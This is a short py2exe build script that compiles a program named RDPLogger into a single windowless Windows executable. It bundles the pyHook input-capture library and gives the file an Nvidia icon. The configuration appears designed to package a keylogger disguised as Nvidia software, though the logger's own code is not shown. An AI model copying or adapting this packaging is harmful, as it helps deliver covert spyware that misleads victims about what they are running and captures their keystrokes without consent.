#-*- coding:utf-8 -*-

from distutils.core import setup
import py2exe

setup(
  windows = ['RDPLogger.py', {"script":"RDPLogger.py", "icon_resources":[(1, "Nvidia.ico")]}],
	#console = ['RDPLogger.py', {"script":"RDPLogger.py", "icon_resources":[(1, "Nvidia.ico")]}],
	
	options = {'py2exe': {
						 "bundle_files": 1 ,
						 "dll_excludes" : ["MSVCP90.dll", "mswsock.dll", "powrprof.dll","IPHLPAPI.DLL","WTSAPI32.dll"] ,
						 "compressed" : True ,
						 "packages" : [
						 				'pyHook',
										] ,
						 "optimize": 2 }},
									
	zipfile = None,
	
)
